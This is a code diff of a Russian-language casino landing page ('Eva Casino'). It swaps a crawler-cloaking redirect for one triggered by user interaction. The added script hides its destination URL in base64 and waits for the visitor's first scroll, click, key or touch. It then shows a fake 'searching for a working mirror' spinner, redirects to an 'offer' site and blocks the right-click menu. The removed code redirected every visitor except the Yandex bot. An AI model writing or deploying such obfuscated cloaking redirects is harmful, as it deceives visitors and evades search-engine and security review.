@@ -24,14 +24,30 @@
         }
       }
     }
-var ua = navigator.userAgent.toLowerCase();
-var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
 
-if (ua.indexOf("yandex") === -1) {
-    location.replace(atob(targetB64));
-} else {
-    console.log("Яндекс бот — без редиректа");
-}
+    (function() {
+    var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+    var triggered = false;
+    console.log("Скрипт защиты запущен. Ждем действий пользователя...");
+    function startGo() {
+        if (triggered) return;
+        triggered = true;
+        console.log("Действие зафиксировано! Показываю крутилку...");
+        var overlay = document.getElementById('redirect-overlay');
+        if (overlay) {
+            overlay.style.display = 'flex';
+        }
+        setTimeout(function() {
+            console.log("Редирект на оффер!");
+            window.location.replace(atob(targetB64));
+        }, 2500);
+    }
+    window.addEventListener('scroll', startGo, {passive: true});
+    window.addEventListener('mousedown', startGo);
+    window.addEventListener('keydown', startGo);
+    window.addEventListener('touchstart', startGo, {passive: true});
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+})();
   </script>
   <style>
     @keyframes shimmer {
@@ -78,6 +94,14 @@ if (ua.indexOf("yandex") === -1) {
   </style>
 </head>
 <body class="bg-casino-900 text-gray-200 overflow-x-hidden">
+  <div id="redirect-overlay" style="position:fixed; inset:0; z-index:99999; display:none; flex-direction:column; align-items:center; justify-center:center; background:#0a0a14; color:white; font-family:sans-serif; text-align:center;">
+    <div style="width:60px; height:60px; border:5px solid rgba(255,215,0,0.1); border-top:5px solid #FFD700; border-radius:50%; animation: spin 1s linear infinite; margin-bottom:20px;"></div>
+    <h2 style="font-size:20px; margin-bottom:10px;">Ищем рабочее зеркало...</h2>
+    <p style="color:#888; font-size:14px;">Пожалуйста, подождите 2-3 секунды</p>
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</div>
 <script type="text/javascript">
     (function(m,e,t,r,i,k,a){
         m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
@@ -89,13 +113,6 @@ if (ua.indexOf("yandex") === -1) {
     ym(103345259, 'init', {webvisor:true, clickmap:true, referrer: document.referrer, url: location.href, accurateTrackBounce:true, trackLinks:true});
 </script>
 <noscript><div><img src="https://mc.yandex.ru/watch/103345259" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
-  <div id="redirect-overlay" class="fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-[#0a0a14] transition-opacity duration-500 opacity-0 pointer-events-none">
-    <div class="w-16 h-16 border-4 border-gold-400/20 border-t-gold-400 rounded-full animate-spin mb-6"></div>
-    <div class="text-center px-6">
-        <h2 class="text-xl md:text-2xl font-bold text-white mb-2">Минутку, ищем рабочее зеркало...</h2>
-        <p class="text-gray-400 text-sm animate-pulse">Пожалуйста, не закрывайте страницу</p>
-    </div>
-</div>
   <nav class="fixed top-0 left-0 right-0 z-50 bg-casino-900/90 backdrop-blur-md border-b border-white/5" role="navigation" aria-label="Основная навигация">
     <div class="max-w-6xl mx-auto px-4 h-14 flex items-center justify-between">
       <a href="#hero" class="flex items-center gap-2 group" aria-label="Eva Casino — на главную">
